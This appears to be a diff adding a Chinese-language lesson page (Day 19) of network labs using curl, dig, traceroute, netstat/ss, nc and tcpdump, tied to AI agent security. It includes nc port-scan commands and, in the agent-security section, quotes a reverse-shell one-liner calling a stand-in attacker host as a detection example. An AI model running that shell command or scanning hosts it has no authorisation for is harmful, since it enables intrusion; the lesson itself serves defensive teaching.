@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Day 19 · LAB 网络动手</title>
+<style>
+  :root {
+    --bg: #fafaf7;
+    --ink: #2a2a2a;
+    --muted: #6b6b6b;
+    --accent: #c2410c;
+    --accent-soft: #fed7aa;
+    --line: #e7e5e0;
+    --card: #ffffff;
+    --code-bg: #f4f1ec;
+    --callout-bg: #fff7ed;
+    --lab-bg: #f0f9ff;
+    --lab-border: #7dd3fc;
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
+    background: var(--bg);
+    color: var(--ink);
+    line-height: 1.78;
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 32px 80px;
+  }
+  .header { background: var(--card); border: 1px solid var(--line); border-left: 6px solid var(--accent); border-radius: 6px; padding: 20px 24px; margin-bottom: 28px; }
+  .header h1 { font-size: 22px; margin: 0 0 8px; color: var(--accent); }
+  .header .meta { font-size: 13px; color: var(--muted); font-family: ui-monospace, "SF Mono", monospace; }
+  .toc { background: var(--card); border: 1px solid var(--line); border-radius: 6px; padding: 14px 20px; margin: 0 0 32px; font-size: 13.5px; }
+  .toc ol { margin: 4px 0; padding-left: 24px; }
+  .toc a { color: var(--accent); text-decoration: none; }
+  .leadin { background: var(--callout-bg); border-left: 3px solid var(--accent-soft); padding: 14px 18px; border-radius: 4px; margin: 0 0 36px; font-size: 15px; }
+  h2 { font-size: 20px; margin-top: 48px; color: var(--accent); border-left: 4px solid var(--accent); padding-left: 12px; }
+  h3 { font-size: 16.5px; margin-top: 24px; color: #444; }
+  p { margin: 12px 0; }
+  code { background: var(--code-bg); padding: 1px 6px; border-radius: 3px; font-size: 13.5px; font-family: ui-monospace, "SF Mono", monospace; }
+  pre { background: var(--code-bg); padding: 14px 16px; border-radius: 6px; overflow-x: auto; font-size: 13.5px; line-height: 1.55; margin: 16px 0; }
+  pre code { background: transparent; padding: 0; font-size: inherit; }
+  .lab-block {
+    background: var(--lab-bg);
+    border-left: 4px solid var(--lab-border);
+    padding: 14px 20px;
+    border-radius: 6px;
+    margin: 24px 0;
+  }
+  .lab-block h3 { margin-top: 8px; color: #0369a1; }
+  .lab-step { background: var(--card); border: 1px solid var(--line); border-radius: 4px; padding: 10px 14px; margin: 10px 0; font-size: 14px; }
+  .lab-step .label { display: inline-block; background: #0369a1; color: white; font-size: 11px; padding: 1px 8px; border-radius: 3px; margin-right: 8px; vertical-align: middle; }
+  .expect { background: #fef3c7; border-left: 3px solid #f59e0b; padding: 8px 12px; margin: 10px 0; font-size: 13.5px; border-radius: 3px; }
+  .expect strong { color: #92400e; }
+  .ascii { font-family: ui-monospace, "SF Mono", monospace; font-size: 13px; background: var(--code-bg); padding: 16px 20px; border-radius: 6px; white-space: pre; overflow-x: auto; line-height: 1.4; margin: 18px 0; }
+  table { border-collapse: collapse; width: 100%; margin: 16px 0; font-size: 14px; }
+  th, td { border: 1px solid var(--line); padding: 10px 12px; text-align: left; vertical-align: top; }
+  th { background: var(--code-bg); font-weight: 600; }
+  .connect { background: var(--callout-bg); border-left: 4px solid var(--accent); padding: 18px 22px; border-radius: 4px; margin: 36px 0; }
+  .connect h2 { margin-top: 0; border-left: none; padding-left: 0; }
+  .next { margin-top: 48px; padding: 14px 18px; background: var(--card); border: 1px dashed var(--accent-soft); border-radius: 4px; font-size: 14px; color: var(--muted); }
+  .next strong { color: var(--accent); }
+  .key { background: linear-gradient(transparent 60%, var(--accent-soft) 60%); padding: 0 2px; }
+  ul, ol { padding-left: 24px; }
+  li { margin: 4px 0; }
+  .term { color: var(--accent); font-weight: 600; }
+  .warn { background: #fee2e2; border-left: 4px solid #dc2626; padding: 10px 14px; font-size: 14px; border-radius: 3px; margin: 14px 0; }
+  .warn strong { color: #991b1b; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>Day 19 · LAB 网络动手 🔧</h1>
+  <div class="meta">Week 03 · 周五（序号）· 2026-06-03 · 主线：网络 Part 1 · 预计 30min 阅读 + 1.5h 上机</div>
+</div>
+
+<div class="leadin">
+<strong>今日导读</strong>：本周前 4 天讲了 IP、TCP、UDP、HTTP、TLS、DNS——满满的协议字段和状态机，全是脑子里的图。今天<strong>全部落到命令行</strong>。我们会用一组工具把抽象协议变成你眼睛能看到的字节：<span class="key">curl 发请求看分阶段耗时 → dig 解析 DNS → traceroute/mtr 看包走过哪些路由器 → ss/netstat 看本机连接和 TCP 状态 → nc 手敲一个 HTTP 请求 → tcpdump 抓包亲眼看三次握手的 SYN/ACK</span>。看完今天，前 4 天那些"状态机"和"握手图"会从课本里跳到你的终端里。所有命令在 mac 上都能跑（标注了 Linux 差异），输出预期我都写在框里——对照着看。
+</div>
+
+<div class="toc">
+<strong>今日实验</strong>
+<ol>
+  <li><a href="#l1">LAB 1：curl 高级——看一个请求的分阶段耗时</a></li>
+  <li><a href="#l2">LAB 2：dig / nslookup——DNS 解析全过程</a></li>
+  <li><a href="#l3">LAB 3：traceroute / mtr——包走过哪些路由器</a></li>
+  <li><a href="#l4">LAB 4：ss / netstat——本机连接与 TCP 状态机</a></li>
+  <li><a href="#l5">LAB 5：nc——手敲一个 HTTP 请求</a></li>
+  <li><a href="#l6">LAB 6：tcpdump / Wireshark——亲眼看三次握手</a></li>
+  <li><a href="#connect">与 AI / Agent 安全的连结</a></li>
+</ol>
+</div>
+
+<div class="warn">
+<strong>平台说明</strong>：你在 mac 上。<code>curl</code>、<code>dig</code>、<code>nc</code>、<code>tcpdump</code> mac 都自带；<code>ss</code> 是 Linux 专属（mac 用 <code>netstat</code> / <code>lsof</code> 替代），<code>traceroute</code> mac 自带但 <code>mtr</code> 要 <code>brew install mtr</code>。抓包 / traceroute 通常需要 <code>sudo</code>。<strong>强烈建议</strong>之后在一个 Linux Docker（<code>docker run --rm -it nicolaka/netshoot</code>，这是个塞满网络工具的镜像）里把今天的 LAB 重做一遍——你的 LLM 服务最终跑在 Linux 上，工具差异不能不知道。
+</div>
+
+<h2 id="l1">1. LAB 1：curl 高级——看一个请求的分阶段耗时</h2>
+
+<p><code>curl</code> 你一定用过，但 99% 的人只用它下载东西。今天把它当成<strong>网络诊断仪</strong>：一个 HTTPS 请求从 DNS 解析、TCP 握手、TLS 握手到首字节返回，每一阶段花了多少毫秒，curl 全能拆给你看。这正好把本周 Day 15-18 的协议栈串成一条时间线。</p>
+
+<div class="lab-block">
+<h3>步骤</h3>
+
+<div class="lab-step"><span class="label">A</span>看响应头和协议版本。</div>
+<pre><code># -I 只发 HEAD 请求，只看响应头
+curl -I https://www.cloudflare.com
+
+# -v 看完整握手细节（DNS、TCP、TLS、HTTP 全过程）
+curl -v https://www.cloudflare.com -o /dev/null</code></pre>
+
+<div class="expect"><strong>解读</strong>：<code>-v</code> 输出里 <code>*</code> 开头是 curl 的诊断信息，<code>&gt;</code> 是你发出去的请求行，<code>&lt;</code> 是服务器返回的。你能看到 <code>* Connected to ...</code>（TCP 建好了）、<code>* TLSv1.3 ... handshake</code>（Day 18 的 TLS 握手）、<code>* using HTTP/2</code>（Day 17 的协议升级）。这一屏就是本周前四天的协议栈的实况。</div>
+
+<div class="lab-step"><span class="label">B</span>用 <code>-w</code> 打印分阶段耗时——这是今天最值钱的一招。</div>
+<pre><code># 把这段存成一个格式模板
+cat &gt; /tmp/curl-timing.txt &lt;&lt;'EOF'
+    DNS 解析:  %{time_namelookup}s
+    TCP 连接:  %{time_connect}s
+   TLS 握手:  %{time_appconnect}s
+  服务器处理:  %{time_starttransfer}s
+   ===========================
+      总耗时:  %{time_total}s
+   HTTP 版本:  %{http_version}
+     状态码:  %{http_code}
+EOF
+
+curl -w "@/tmp/curl-timing.txt" -o /dev/null -s https://www.cloudflare.com</code></pre>
+
+<div class="expect"><strong>预期</strong>：你会看到类似 <code>DNS 解析: 0.012s / TCP 连接: 0.045s / TLS 握手: 0.110s / 服务器处理: 0.160s / 总耗时: 0.165s</code>。注意这几个数字是<strong>累计的</strong>（从请求开始算起），不是各阶段独立耗时。想知道 TLS 握手单独花了多久？用 <code>time_appconnect - time_connect</code>。<span class="key">线上排查"接口慢"时，第一件事就是用这招定位慢在哪一段</span>——DNS 慢、还是建连慢、还是后端慢，一目了然。</div>
+
+<div class="lab-step"><span class="label">C</span>对比 HTTP/1.1 vs HTTP/2，复用连接 vs 每次新建。</div>
+<pre><code># 强制用 HTTP/1.1
+curl -w "%{http_version} %{time_total}s\n" -o /dev/null -s --http1.1 https://www.cloudflare.com
+
+# 强制用 HTTP/2（默认就会协商成 h2）
+curl -w "%{http_version} %{time_total}s\n" -o /dev/null -s --http2 https://www.cloudflare.com
+
+# 一个连接里连发 3 个请求（看连接复用省下的握手时间）
+curl -s -o /dev/null -w "%{time_total}s\n" \
+  https://www.cloudflare.com https://www.cloudflare.com https://www.cloudflare.com</code></pre>
+
+<div class="expect"><strong>解读</strong>：第三条命令里，第一个请求要做完整的 DNS+TCP+TLS，后两个请求<strong>复用同一条连接</strong>，所以总耗时远小于 3 倍单次。这就是 Day 17 讲的 keep-alive / 连接复用的价值——也是为什么你调 LLM API 时要用一个持久的 <code>httpx.Client</code> 而不是每次 <code>requests.get</code> 新建连接。</div>
+</div>
+
+<h2 id="l2">2. LAB 2：dig / nslookup——DNS 解析全过程</h2>
+
+<p>Day 15 讲了 ARP/IP，Day 21（周日）会专门讲 DNS。今天先用 <code>dig</code> 把"域名 → IP"这一步看清楚——它是<strong>每个网络请求的第 0 步</strong>，也是最容易被忽视、最容易出问题的一步。</p>
+
+<div class="lab-block">
+<h3>步骤</h3>
+
+<div class="lab-step"><span class="label">A</span>最基本的解析。</div>
+<pre><code>dig www.cloudflare.com
+
+# mac 也自带 nslookup（更简洁，但信息少）
+nslookup www.cloudflare.com</code></pre>
+
+<div class="expect"><strong>解读 dig 输出</strong>：看 <code>;; ANSWER SECTION:</code> 下面的行，格式是 <code>域名  TTL  IN  A  IP地址</code>。<code>A</code> 记录是 IPv4 地址，<code>AAAA</code> 是 IPv6。<code>TTL</code>（生存时间，秒）告诉解析器"这条结果能缓存多久"——这就是为什么你改了 DNS 不会立刻生效。底部 <code>;; Query time: 12 msec</code> 是这次解析耗时。</div>
+
+<div class="lab-step"><span class="label">B</span>查不同类型的记录。</div>
+<pre><code>dig cloudflare.com A        # IPv4 地址
+dig cloudflare.com AAAA     # IPv6 地址
+dig cloudflare.com MX       # 邮件服务器
+dig cloudflare.com NS       # 这个域名由哪些权威 DNS 服务器负责
+dig cloudflare.com TXT      # 文本记录（常放 SPF、域名所有权验证）
+
+# +short 只要答案，不要一堆元信息
+dig +short www.cloudflare.com</code></pre>
+
+<div class="lab-step"><span class="label">C</span>看完整的递归解析链——从根服务器一步步问下来。</div>
+<pre><code>dig +trace www.cloudflare.com</code></pre>
+
+<div class="expect"><strong>预期</strong>：<code>+trace</code> 会打印一整条链：先问<strong>根服务器</strong>（<code>.</code>）"<code>.com</code> 谁管？"→ 根告诉你 <code>.com</code> 的 NS → 再问 <code>.com</code> 服务器"<code>cloudflare.com</code> 谁管？"→ 拿到 cloudflare 的权威 NS → 最后问权威 NS 拿到 IP。<span class="key">这就是 Day 21 要讲的"递归 vs 迭代解析"的迭代过程</span>，你今天先亲眼看一遍这条链。</div>
+
+<div class="lab-step"><span class="label">D</span>指定用哪台 DNS 服务器解析（绕过本机默认）。</div>
+<pre><code># 用 Cloudflare 的公共 DNS 1.1.1.1 解析
+dig @1.1.1.1 www.cloudflare.com
+
+# 用 Google 的 8.8.8.8
+dig @8.8.8.8 www.cloudflare.com</code></pre>
+
+<div class="expect"><strong>思考</strong>：同一个域名，用不同 DNS 服务器解析，可能拿到<strong>不同的 IP</strong>——这不是 bug，是 CDN 的<strong>就近调度</strong>：DNS 服务器根据你的位置返回最近的边缘节点。当你怀疑"是不是 DNS 被污染了 / 解析到了错误的机房"，<code>dig @不同DNS</code> 对比是第一招。</div>
+</div>
+
+<h2 id="l3">3. LAB 3：traceroute / mtr——包走过哪些路由器</h2>
+
+<p>Day 15 讲了 IP 包逐跳转发、TTL（生存时间）字段。<code>traceroute</code> 就是利用 TTL 的一个巧妙把戏：它发出 TTL=1 的包，第一个路由器会把它丢弃并回一个"超时"错误（暴露了自己的 IP）；再发 TTL=2，第二个路由器暴露……这样一跳一跳把整条路径"逼"出来。</p>
+
+<div class="lab-block">
+<h3>步骤</h3>
+
+<div class="lab-step"><span class="label">A</span>追踪到一个目标的完整路径。</div>
+<pre><code>traceroute www.cloudflare.com
+
+# 默认用 UDP 探测，有些路由器不回。改用 ICMP（mac 加 -I），成功率更高
+sudo traceroute -I www.cloudflare.com</code></pre>
+
+<div class="expect"><strong>解读</strong>：每一行是一"跳"（一个路由器），格式 <code>跳数  路由器IP/域名  三次往返延迟(ms)</code>。第 1 跳通常是你家路由器（<code>192.168.x.1</code>），往后是运营商的网关、骨干网，最后到目标。看到 <code>* * *</code> 是正常的——有些路由器配置了不回 ICMP，不代表断了。延迟突然从 10ms 跳到 150ms 的那一跳，往往就是出国 / 跨运营商的链路。</div>
+
+<div class="lab-step"><span class="label">B</span>用 <code>mtr</code>——traceroute 和 ping 的结合体，持续刷新统计。</div>
+<pre><code># mac 需要先装：brew install mtr
+# 报告模式：跑 10 个周期后输出统计表
+sudo mtr -r -c 10 www.cloudflare.com
+
+# 交互模式（实时刷新，按 q 退出）
+sudo mtr www.cloudflare.com</code></pre>
+
+<div class="expect"><strong>预期</strong>：<code>mtr</code> 的核心列是 <code>Loss%</code>（丢包率）和 <code>Avg</code>（平均延迟）。<span class="key">看 Loss% 在哪一跳开始升高，就定位到了网络问题发生在哪一段</span>。注意一个坑：<strong>中间某跳显示丢包、但后面的跳又不丢，通常是那台路由器限速了 ICMP 回包，不是真丢包</strong>——只有"从某跳开始一直丢到终点"才是真问题。这是排查跨地域网络抖动的利器。</div>
+</div>
+
+<h2 id="l4">4. LAB 4：ss / netstat——本机连接与 TCP 状态机</h2>
+
+<p>Day 16 画了 TCP 状态机：<code>LISTEN → SYN_SENT → ESTABLISHED → ... → TIME_WAIT → CLOSED</code>。这些状态不是抽象概念，你本机此刻就有几十上百条连接处在不同状态。<code>ss</code>（Linux）/ <code>netstat</code>（mac+Linux）让你<strong>把状态机的快照打出来看</strong>。</p>
+
+<div class="lab-block">
+<h3>步骤</h3>
+
+<div class="lab-step"><span class="label">A</span>看本机所有监听端口（谁在等连接）。</div>
+<pre><code># Linux: ss 是 netstat 的现代替代，快得多
+ss -tlnp      # -t TCP -l listening -n 数字端口 -p 进程
+
+# mac 没有 ss，用 netstat 或 lsof
+netstat -an -p tcp | grep LISTEN
+sudo lsof -iTCP -sTCP:LISTEN -n -P    # mac 上看监听端口+进程，最好用</code></pre>
+
+<div class="expect"><strong>解读</strong>：每个监听项是一个"服务器在某端口等客人"。<code>*:8000</code> 或 <code>0.0.0.0:8000</code> 表示监听所有网卡（外网可达，注意安全！），<code>127.0.0.1:8000</code> 表示只监听本机回环（外网连不上，安全）。<span class="key">部署 LLM 服务时把 vLLM 绑到 <code>0.0.0.0</code> 还是 <code>127.0.0.1</code>，直接决定它是否暴露在公网——这是最常见的安全事故来源之一</span>。</div>
+
+<div class="lab-step"><span class="label">B</span>看所有已建立的连接，并按状态统计。</div>
+<pre><code># Linux
+ss -tan                                    # 列所有 TCP 连接 + 状态
+ss -tan | awk 'NR>1 {print $1}' | sort | uniq -c   # 按状态统计数量
+
+# mac
+netstat -an -p tcp | awk '{print $6}' | sort | uniq -c</code></pre>
+
+<div class="expect"><strong>预期</strong>：你会看到一张状态分布表，类似 <code>45 ESTABLISHED / 12 TIME_WAIT / 3 LISTEN / 1 CLOSE_WAIT</code>。<code>ESTABLISHED</code> 是正在用的连接；<code>TIME_WAIT</code> 是主动关闭方留下的"等 2MSL"的尾巴（Day 16 讲过，防止旧包串场）；如果看到<strong>大量 <code>CLOSE_WAIT</code> 堆积，那是 bug 信号</strong>——说明对方关了连接但你的程序忘了 close()，文件描述符在泄漏。</div>
+
+<div class="lab-step"><span class="label">C</span>制造一条连接，盯着它的状态变化。</div>
+<pre><code># 终端 1：起一个监听
+nc -l 9999          # mac;  Linux 用 nc -l -p 9999
+
+# 终端 2：连上去
+nc 127.0.0.1 9999
+
+# 终端 3：看这条连接的状态（应该是 ESTABLISHED）
+netstat -an -p tcp | grep 9999     # mac
+# ss -tan | grep 9999              # Linux
+
+# 现在在终端 2 按 Ctrl+C 断开，立刻再看终端 3
+# 你会看到状态变成 TIME_WAIT，几十秒后消失</code></pre>
+
+<div class="expect"><strong>解读</strong>：你刚刚<strong>亲手驱动了一遍 TCP 状态机</strong>：建连时 ESTABLISHED，主动关闭方进入 TIME_WAIT 并停留约 2×MSL（mac 默认 ~15-30s，Linux ~60s）后才消失。这就是为什么压测工具频繁建连断连时，机器会积压成千上万的 TIME_WAIT 占满端口——也是 Day 16 提到 <code>SO_REUSEPORT</code> 和调内核参数的由来。</div>
+</div>
+
+<h2 id="l5">5. LAB 5：nc——手敲一个 HTTP 请求</h2>
+
+<p><code>nc</code>（netcat）被称为网络界的瑞士军刀：它能在任意 TCP/UDP 端口上收发原始字节。今天用它干一件"揭穿魔法"的事——<strong>用手敲的方式发一个 HTTP 请求</strong>，让你彻底明白 Day 17 讲的"HTTP 不过是 TCP 上的纯文本"。</p>
+
+<div class="lab-block">
+<h3>步骤</h3>
+
+<div class="lab-step"><span class="label">A</span>手敲 HTTP/1.1 请求（明文 HTTP，不带 TLS）。</div>
+<pre><code># 连到一个支持明文 HTTP 的站点的 80 端口
+nc example.com 80
+
+# 连上后，手动逐行输入下面三行（最后必须敲两次回车！）：
+GET / HTTP/1.1
+Host: example.com
+
+</code></pre>
+
+<div class="expect"><strong>预期</strong>：敲完<strong>空行</strong>（这个空行告诉服务器"请求头结束了"）后，服务器立刻把响应吐回来：<code>HTTP/1.1 200 OK</code> + 一堆响应头 + 空行 + HTML 正文。<span class="key">你刚刚没用任何浏览器、没用 curl，纯手打字符就完成了一次 HTTP 请求</span>——这就证明了 HTTP/1.1 本质是"在 TCP 连接上互发纯文本"。Day 17 讲的请求行、Host 头、空行分隔，你现在亲手敲了一遍。</div>
+
+<div class="lab-step"><span class="label">B</span>用脚本方式发（不手打），看完整响应。</div>
+<pre><code>printf 'GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' \
+  | nc example.com 80</code></pre>
+
+<div class="expect"><strong>解读</strong>：注意行尾是 <code>\r\n</code>（回车+换行）——HTTP 协议规定每行必须用 CRLF 结尾，这是协议的硬性格式。<code>Connection: close</code> 告诉服务器"回完就断开"，否则连接会 keep-alive 挂着等你下一个请求。</div>
+
+<div class="lab-step"><span class="label">C</span>用 nc 做端口扫描——探测某主机开了哪些端口。</div>
+<pre><code># -z 只探测不发数据（zero-I/O），-v 显示结果，-w 超时
+nc -zv example.com 80 443 22 2>&1
+
+# 扫一个端口范围（mac/Linux 通用）
+nc -zv 127.0.0.1 8000-8010 2>&1</code></pre>
+
+<div class="expect"><strong>解读</strong>：<code>succeeded / open</code> 表示该端口有服务在监听，<code>refused</code> 表示端口关闭（机器明确拒绝），<strong>超时无响应</strong>则通常是被防火墙挡了（连拒绝都不回）。这就是 <code>nmap</code> 这类扫描器的最朴素原理——Day 27 周六的 C2 专题、以及后面红队内容会深入。<span class="warn" style="display:inline">只扫你自己拥有或获得授权的主机。</span></div>
+</div>
+
+<h2 id="l6">6. LAB 6：tcpdump / Wireshark——亲眼看三次握手</h2>
+
+<p>压轴。Day 16 画了 TCP 三次握手 <code>SYN → SYN+ACK → ACK</code> 的图。今天用 <code>tcpdump</code> 抓真实的包，<strong>在你自己的网卡上看到这三个包飞过去</strong>。看完这一节，三次握手对你就不再是课本插图，而是亲眼见过的东西。</p>
+
+<div class="warn">
+<strong>注意</strong>：抓包需要 <code>sudo</code>。抓包会看到流经网卡的所有流量——<strong>只在你自己的机器、自己的网络上抓，且不要长期记录他人流量</strong>。这是法律与伦理底线。
+</div>
+
+<div class="lab-block">
+<h3>步骤</h3>
+
+<div class="lab-step"><span class="label">A</span>抓一次握手——先开抓包，再发请求。</div>
+<pre><code># 终端 1：开始抓包。先用 dig 拿到 example.com 的一个 IP，比如 93.184.x.x
+dig +short example.com
+# 假设拿到 93.184.215.14，盯住到它 80 端口的包：
+sudo tcpdump -n -i any "host 93.184.215.14 and port 80"
+
+# 终端 2：发一个请求触发握手
+curl -s http://example.com -o /dev/null</code></pre>
+
+<div class="expect"><strong>预期</strong>：终端 1 会先打印三行，正是<strong>三次握手</strong>：<br>
+<code>... Flags [S], seq 12345 ...</code> &nbsp;← 你发出的 SYN<br>
+<code>... Flags [S.], seq 67890, ack 12346 ...</code> &nbsp;← 服务器回的 SYN+ACK（<code>.</code> 代表 ACK 标志位）<br>
+<code>... Flags [.], ack 67891 ...</code> &nbsp;← 你回的 ACK<br>
+之后才是 <code>Flags [P.]</code>（PUSH+ACK，带 HTTP 数据的包）。<span class="key">seq 和 ack 号一一对应（ack = 对方 seq + 1），你亲眼看到了 Day 16 讲的序列号确认机制</span>。结尾还能看到 <code>Flags [F.]</code>（FIN）的挥手过程。</div>
+
+<div class="lab-step"><span class="label">B</span>读懂 tcpdump 常用过滤表达式（周六会深入）。</div>
+<pre><code>sudo tcpdump -n -i any "tcp port 443"          # 只抓 443（HTTPS）
+sudo tcpdump -n -i any "host 1.1.1.1"          # 只抓和某 IP 的往来
+sudo tcpdump -n -i any "tcp[tcpflags] & tcp-syn != 0"   # 只抓含 SYN 标志的包
+sudo tcpdump -n -i any "udp port 53"           # 只抓 DNS 查询（UDP 53）
+sudo tcpdump -n -i any -c 20 -w /tmp/cap.pcap "port 80"  # 抓 20 个包存成文件</code></pre>
+
+<div class="expect"><strong>解读</strong>：<code>-n</code> 不做反向 DNS（否则抓包时会卡）；<code>-i any</code> 抓所有网卡；引号里是 <strong>BPF 过滤表达式</strong>，能精确到协议、端口、IP、甚至 TCP 标志位。<code>-w file.pcap</code> 把原始包存成文件——这个 <code>.pcap</code> 文件可以拖进 Wireshark 用图形界面慢慢分析。</div>
+
+<div class="lab-step"><span class="label">C</span>（可选）用 Wireshark 图形化看。</div>
+<pre><code># mac 安装：brew install --cask wireshark
+# 把上一步存的文件用 Wireshark 打开：
+open -a Wireshark /tmp/cap.pcap</code></pre>
+
+<div class="expect"><strong>玩法</strong>：在 Wireshark 顶部过滤框输入 <code>tcp.flags.syn==1</code> 只看 SYN 包；右键任一包选 <strong>Follow → TCP Stream</strong>，能把一条连接的所有来回字节按顺序拼出来看（HTTP 明文请求/响应一览无余）。Day 20（明天周六）会专门深入 Wireshark + TLS 解密，今天先建立"原来包能被肉眼看到"的直觉。</div>
+</div>
+
+<div class="connect" id="connect">
+<h2>🔗 与 AI / Agent 安全的连结</h2>
+
+<p><strong>1. <code>ss</code>/<code>netstat</code> 是发现"Agent 偷连外网"的第一道哨兵</strong>。你的 Agent 安全产品要监控不可信代码的网络行为——当一段被 prompt injection 诱导的代码尝试把数据外传（exfiltration），它必须先建一条 TCP 连接。在沙箱里周期性跑 <code>ss -tanp</code> 快照、比对"白名单之外的 ESTABLISHED 连接"，就是最朴素有效的检测。生产环境会换成 eBPF（Week 2 提过）实时拦截 <code>connect()</code> syscall，但 <code>ss</code> 让你今天就建立"连接可见"的直觉。</p>
+
+<p><strong>2. <code>curl -w</code> 的分阶段耗时是 LLM 网关 SLO 的诊断起点</strong>。你的 LLM 推理网关 P99 延迟飙了，到底是 DNS 慢、上游 TCP/TLS 建连慢、还是模型后端处理慢？今天 LAB 1 的 <code>time_namelookup / time_connect / time_appconnect / time_starttransfer</code> 四段拆解，直接对应你将来在 Grafana 里要拆的延迟瀑布图。对流式 LLM 响应尤其关键：<code>time_starttransfer</code> 约等于 TTFT（首 token 时间），是用户最敏感的指标。</p>
+
+<p><strong>3. <code>nc</code> 是反弹 shell 的经典载体——你必须先会用它，才能检测它</strong>。Day 27 周六会讲 C2 与反弹 shell，其中最教科书的一行就是 <code>nc -e /bin/sh attacker_ip 4444</code>。一个被攻陷的 Agent 沙箱，攻击者最想做的就是建一条反弹连接拿到交互式 shell。今天你手动用 <code>nc</code> 起监听、连接、扫端口，正是为了理解检测侧要盯什么：<strong>非常规端口的出站连接 + 连接上立刻有 shell 流量</strong>。</p>
+
+<p><strong>4. tcpdump 抓包是"模型 API 到底发了什么"的终极真相</strong>。当你怀疑某个第三方 LLM SDK 偷偷上传了你的 prompt、或想确认请求里有没有泄漏 API key，应用层日志可能撒谎、可能不全，但<strong>网卡上的字节不会骗人</strong>。今天 LAB 6 的 tcpdump + Follow TCP Stream，就是你将来做"数据流真实性审计"的底层手段。HTTPS 加密看不到内容?——明天 Day 20 会教你用 <code>SSLKEYLOGFILE</code> 解密自己的 TLS 流量看明文。</p>
+
+<p><strong>5. <code>dig @不同DNS</code> 对应 Agent 世界里的"工具被指向恶意端点"风险</strong>。DNS 是信任链的第 0 环：如果一个 Agent 要调用 <code>api.trusted-tool.com</code>，但本地 DNS 被污染、解析到了攻击者的 IP，Agent 就会把请求(连带凭据)发给假服务器。今天用 <code>dig +trace</code> 看清整条解析链、用 <code>dig @1.1.1.1</code> 对比不同解析结果，是你将来做"工具端点可信验证 / DNS 投毒检测"的基础认知。这也是为什么零信任架构里要做 mTLS（Day 18 提过、Day 111 深入）——不光信 DNS，还要用证书验证对方真实身份。</p>
+</div>
+
+<h2>📝 今日小结</h2>
+
+<p>你今天 hands-on 接触的网络工具速查表（建议存下来，未来 24 周经常翻）：</p>
+
+<table>
+<tr><th>工具</th><th>一句话用途</th><th>最值钱的一招</th></tr>
+<tr><td><code>curl</code></td><td>发请求 + 网络诊断</td><td><code>-w "@timing.txt"</code> 看分阶段耗时</td></tr>
+<tr><td><code>dig</code> / <code>nslookup</code></td><td>DNS 解析</td><td><code>dig +trace</code> 看递归解析链</td></tr>
+<tr><td><code>traceroute</code> / <code>mtr</code></td><td>追踪包走过的路由器</td><td><code>mtr -r</code> 看每跳丢包率</td></tr>
+<tr><td><code>ss</code> (Linux) / <code>netstat</code></td><td>本机连接与 TCP 状态</td><td>按状态统计、抓 CLOSE_WAIT 泄漏</td></tr>
+<tr><td><code>lsof -iTCP</code> (mac 优选)</td><td>哪个进程占了哪个端口</td><td><code>-sTCP:LISTEN</code> 看监听端口</td></tr>
+<tr><td><code>nc</code></td><td>原始 TCP/UDP 收发</td><td>手敲 HTTP、扫端口、起监听</td></tr>
+<tr><td><code>tcpdump</code></td><td>抓包看原始字节</td><td>BPF 过滤 + 看三次握手</td></tr>
+<tr><td><code>Wireshark</code></td><td>图形化分析 .pcap</td><td>Follow TCP Stream 拼出整条流</td></tr>
+</table>
+
+<h2>✏️ 今日小练习</h2>
+<ol>
+  <li><strong>动手</strong>：用 LAB 1 的 <code>curl -w</code> 模板分别请求一个国内站点（如 <code>https://www.baidu.com</code>）和一个国外站点（如 <code>https://www.cloudflare.com</code>），把两者的 <code>time_appconnect</code>（TLS 握手完成时间）记下来对比。算一算各自的"纯 TLS 握手耗时"（<code>time_appconnect - time_connect</code>），想想为什么国外站点这一段更长。</li>
+  <li><strong>观察</strong>：开一个 tcpdump 抓 <code>udp port 53</code>，然后在另一个终端跑 <code>dig www.github.com</code>。数一数你触发了几个 DNS 查询包（提示：可能不止一个——A 记录、AAAA 记录会分别查），并找出每个查询对应的响应包。</li>
+  <li><strong>思考</strong>：你的 LLM 推理服务用 <code>ss -tan</code> 一看，发现有 8000 多条 <code>TIME_WAIT</code> 状态的连接。结合 Day 16 的 TCP 状态机，说出：(a) 这说明你的服务是连接的主动关闭方还是被动关闭方？(b) 为什么会堆这么多？(c) 这会带来什么风险，可以从哪几个方向缓解？</li>
+</ol>
+
+<div class="next">
+<strong>明日预告 · Day 20 · 周六 🔐 · 网络抓包与协议分析（4 小时密集安全专题）</strong>。今天你只是用 tcpdump 瞄了一眼握手，明天我们把抓包玩到底：tcpdump 高级 BPF 表达式、Wireshark 过滤语法与统计、跟踪完整 TCP 流、用 <code>SSLKEYLOGFILE</code> <strong>解密自己的 HTTPS 流量看明文</strong>、中间人攻击原理（sslstrip）、DNS 投毒、以及 DoH/DoT 加密 DNS 的防御。结尾搭一个"抓自己浏览器的 HTTPS 并解密"的实战 lab——这是 Agent 安全产品里"流量真实性审计 / 数据外泄检测"的核心技能。</div>
+
+<!-- nav-injected v1 -->
+<nav id="page-nav" style="display:flex;justify-content:space-between;align-items:center;margin:48px 0 16px;padding-top:20px;border-top:1px solid #e7e5e0;font-size:14px;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC',sans-serif;"></nav>
+<script>
+(function(){
+  var path = window.location.pathname;
+  var m = path.match(/(day|article)-(\d+)\.html$/i);
+  if (!m) return;
+  var type = m[1].toLowerCase();
+  var n = parseInt(m[2], 10);
+  var isDay = type === 'day';
+  var perWeek = isDay ? 7 : 3;
+  var total = 168, accent='#c2410c', soft='#fed7aa';
+  if (path.indexOf('security-plan') !== -1) { total=154; accent='#b91c1c'; soft='#fecaca'; }
+  if (path.indexOf('posttraining-plan') !== -1) { total=48; accent='#1e40af'; soft='#bfdbfe'; }
+  function urlFor(k){
+    var week = Math.ceil(k/perWeek);
+    return '../week-'+String(week).padStart(2,'0')+'/'+type+'-'+(isDay?String(k).padStart(2,'0'):String(k))+'.html';
+  }
+  var label = isDay ? '天' : '篇';
+  var prefix = isDay ? 'Day' : 'Article';
+  var linkS = 'color:'+accent+';text-decoration:none;padding:8px 18px;border:1px solid '+soft+';border-radius:6px;background:#fff;font-weight:500;';
+  var disS = 'color:#cbd5e1;padding:8px 18px;';
